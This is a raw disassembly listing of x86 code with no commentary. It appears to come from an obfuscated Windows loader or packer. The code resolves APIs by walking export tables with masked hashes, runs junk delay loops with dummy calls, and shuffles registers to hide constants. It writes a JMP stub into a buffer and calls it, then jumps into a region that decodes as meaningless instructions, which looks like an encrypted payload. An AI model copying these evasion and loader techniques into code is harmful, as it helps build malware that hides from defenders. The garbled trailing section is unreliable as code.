  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [ecx+0x347c3281],esi
  4058f3:	pop    edi
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	test   edi,ebx
  4058fc:	dec    edi
  4058fd:	inc    ecx
  4058fe:	add    BYTE PTR [eax+0x25],bh
  405901:	push   ss
  405902:	iret   
  405903:	cmp    al,0xc4
  405905:	in     eax,dx
  405906:	sahf   
  405907:	shl    DWORD PTR [edx+0x7d48a47],1
  40590d:	test   BYTE PTR [ecx],0x8c
  405910:	fs inc ebx
  405912:	sbb    al,0x29
  405914:	mov    bl,0x59
  405916:	push   ebp
  405917:	(bad)  
  405918:	xor    DWORD PTR [esi-0x77c2621e],ebx
  40591e:	and    cl,BYTE PTR [ebx+0x46]
  405921:	mov    dh,0x20
  405923:	cmp    ebp,ebp
  405925:	fdiv   QWORD PTR [edx]
  405927:	in     al,0xe0
  405929:	rol    DWORD PTR [edi+0x1bc7fb5f],1
  40592f:	retf   
  405930:	popa   
  405931:	mov    fs:0x28f0e71e,al
  405937:	lock add ebx,DWORD PTR ds:[esp+edi*4]
  40593c:	lea    ecx,[edi+0x54346d7c]
  405942:	popf   
  405943:	arpl   WORD PTR [ecx-0x4a],bp
  405946:	cmp    DWORD PTR [ebx],0xfffffff5
  405949:	cmp    cl,BYTE PTR [eax+esi*8-0x50]
  40594d:	leave  
  40594e:	pop    ebx
  40594f:	icebp  
  405950:	xchg   DWORD PTR [edi-0x24292304],ebx
  405956:	or     eax,0x4b0c4422
  40595b:	sbb    ecx,DWORD PTR [eax+0x29]
  40595e:	fimul  WORD PTR [ebp+0x62b09312]
  405964:	imul   ebp,DWORD PTR [ecx+0x56],0x27
  405968:	ds call 0x310b:0x1d9760f1
  405970:	pop    eax
  405971:	fadd   DWORD PTR [ebx-0x39]
  405974:	dec    ebx
  405975:	sub    edx,DWORD PTR [edx+0x3f61518c]
  40597b:	push   0xc575f987
  405980:	sbb    eax,0x87e62348
  405985:	xor    ebp,DWORD PTR [edx-0x342995a7]
  40598b:	or     BYTE PTR [eax+0x67],dh
  40598e:	fiadd  DWORD PTR [esi]
  405990:	pop    edi
  405991:	pop    es
  405992:	xor    al,ah
  405994:	rcl    DWORD PTR [ecx+0x79],1
  405997:	and    bl,ah
  405999:	push   0x5c
  40599b:	cmp    BYTE PTR [ecx+0x45a62ba7],0x66
  4059a2:	or     dl,BYTE PTR [ecx-0x6f]
  4059a5:	outs   dx,BYTE PTR ds:[esi]
  4059a6:	xchg   ebx,eax
  4059a7:	add    DWORD PTR [esi+0x1ecfe1fa],ecx
  4059ad:	push   esp
  4059ae:	popa   
  4059af:	arpl   WORD PTR [eax],bp
  4059b1:	adc    al,0x42
  4059b3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4059b5:	int3   
  4059b6:	hlt    
  4059b7:	sahf   
  4059b8:	dec    edx
  4059b9:	lds    ebx,FWORD PTR [edx+eax*8]
  4059bc:	in     al,0xac
  4059be:	cmp    dl,BYTE PTR [ecx+0x12]
  4059c1:	mov    ecx,0x10e3c330
  4059c6:	jl     0x405a31
  4059c8:	repnz bound edx,QWORD PTR [ebx+edi*1-0x35]
  4059cd:	js     0x4059cf
  4059cf:	push   0xfffffff1
  4059d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d2:	aad    0xa
  4059d4:	out    dx,eax
  4059d5:	mov    dh,ch
  4059d7:	outs   dx,DWORD PTR ds:[esi]
  4059d8:	xor    eax,ebx
  4059da:	dec    ecx
  4059db:	sub    ch,BYTE PTR [eax]
  4059dd:	arpl   WORD PTR [ecx-0xb],bp
  4059e0:	push   ds
  4059e1:	dec    edx
  4059e2:	ror    BYTE PTR [edi+0x284f7645],cl
  4059e8:	push   ss
  4059e9:	mov    bl,0x83
  4059eb:	aas    
  4059ec:	jo     0x4059d7
  4059ee:	test   DWORD PTR [esi+eiz*1-0x47],ebx
  4059f2:	fcmove st,st(4)
  4059f4:	outs   dx,BYTE PTR ds:[esi]
  4059f5:	icebp  
  4059f6:	jae    0x405a68
  4059f8:	and    al,0x30
  4059fa:	xor    DWORD PTR [eax],eax
  4059fc:	gs popa 
  4059fe:	loope  0x405a7a
  405a00:	pop    es
  405a01:	les    ebp,FWORD PTR [eax-0x28b896f9]
  405a07:	iret   
  405a08:	mov    cl,0x26
  405a0a:	(bad)  
  405a0b:	not    DWORD PTR [edi-0x39]
  405a0e:	fidiv  WORD PTR [esi-0x5ca1f8e9]
  405a14:	mov    cl,0xf9
  405a16:	adc    al,0xbf
  405a18:	and    eax,0xda6cd20c
  405a1d:	xchg   ebx,eax
  405a1e:	pop    ds
  405a1f:	sub    edi,ebp
  405a21:	imul   edx,DWORD PTR [esi+0x13],0xad0b0f8c
  405a28:	and    eax,0x23fedaa
  405a2d:	outs   dx,DWORD PTR ds:[esi]
  405a2e:	add    DWORD PTR [edi+0x209e79d0],esp
  405a34:	icebp  
  405a35:	fadd   DWORD PTR [eax+0x31]
  405a38:	or     BYTE PTR [ebx-0x14db38df],cl
  405a3e:	cmp    dh,BYTE PTR [eax-0x45]
  405a41:	jge    0x405a71
  405a43:	loopne 0x405a0b
  405a45:	and    dl,BYTE PTR [ebp-0x7ad791f5]
  405a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a4c:	pop    ecx
  405a4d:	jge    0x405ab9
  405a4f:	cmp    al,0x25
  405a51:	mov    edx,0xc40cd7ce
  405a56:	outs   dx,BYTE PTR ds:[esi]
  405a57:	test   eax,0xc378e0db
  405a5c:	or     eax,0x3f3e2fd
  405a61:	push   edx
  405a62:	push   edi
  405a63:	out    0xc9,al
  405a65:	mov    dh,bl
  405a67:	push   cs
  405a68:	push   es
  405a69:	xor    ah,BYTE PTR [edi]
  405a6b:	pop    eax
  405a6c:	pop    eax
  405a6d:	stos   BYTE PTR es:[edi],al
  405a6e:	int3   
  405a6f:	xchg   ecx,eax
  405a70:	add    DWORD PTR [edi+0x7f],esp
  405a73:	je     0x4059f7
  405a75:	cli    
  405a76:	sub    dh,dh
  405a78:	idiv   DWORD PTR [ecx-0x6493bcc0]
  405a7e:	sti    
  405a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a80:	bound  ebp,QWORD PTR [edx+0x799aecb4]
  405a86:	fistp  DWORD PTR [ebx+eiz*1]
  405a89:	iret   
  405a8a:	xchg   ecx,eax
  405a8b:	(bad)  
  405a8c:	data16 sbb BYTE PTR [esi],bh
  405a8f:	scas   eax,DWORD PTR es:[edi]
  405a90:	call   0x1282b0ed
  405a95:	or     al,0xf5
  405a97:	sti    
  405a98:	or     BYTE PTR [edi],0xda
  405a9b:	cs jb  0x405a1f
  405a9e:	loop   0x405b0a
  405aa0:	ret    
  405aa1:	jl     0x405b02
  405aa3:	mov    al,ds:0x354bb7cb
  405aa8:	push   edx
  405aa9:	dec    edi
  405aaa:	push   edi
  405aab:	aaa    
  405aac:	cld    
  405aad:	(bad)  
  405aae:	jnp    0x405b0c
  405ab0:	test   al,0x69
  405ab2:	sahf   
  405ab3:	jbe    0x405a62
  405ab5:	loopne 0x405aea
  405ab7:	adc    BYTE PTR [ebp-0x6f9c313b],dl
  405abd:	mov    DWORD PTR [eax],esp
  405abf:	push   ds
  405ac0:	jp     0x405a6f
  405ac2:	shr    DWORD PTR [ebp+eax*8-0x2eaccc19],0x3
  405aca:	and    BYTE PTR [edi],dh
  405acc:	pop    ecx
  405acd:	cmp    BYTE PTR [eax+ebx*8-0x51f83f9c],ch
  405ad4:	push   esi
  405ad5:	fidiv  WORD PTR [ecx-0x3a80a668]
  405adb:	jo     0x405a74
  405add:	aad    0xe9
  405adf:	mov    cl,0xa8
  405ae1:	mov    bh,ch
  405ae3:	mov    bl,0xff
  405ae5:	push   0xb95f64ec
  405aea:	pop    ecx
  405aeb:	sti    
  405aec:	dec    edi
  405aed:	mov    ch,0xf6
  405aef:	inc    esp
  405af0:	or     eax,DWORD PTR [esi]
  405af2:	xchg   BYTE PTR ds:0x3203cd9f,ch
  405af8:	ins    BYTE PTR es:[edi],dx
  405af9:	push   0x7383081b
  405afe:	and    BYTE PTR [ebx-0x3c23274e],al
  405b04:	or     DWORD PTR [edx+0x4d079577],eax
  405b0a:	ds gs inc ebp
  405b0d:	adc    esp,esi
  405b0f:	and    al,0x87
  405b11:	xchg   ebp,eax
  405b12:	adc    al,0x27
  405b14:	cmc    
  405b15:	loope  0x405ac0
  405b17:	repz hlt 
  405b19:	cmc    
  405b1a:	btc    DWORD PTR [esi+0x65],0xd2
  405b1f:	sub    BYTE PTR [esi-0xe32371c],dl
  405b25:	repnz pop eax
  405b27:	mov    ch,0x97
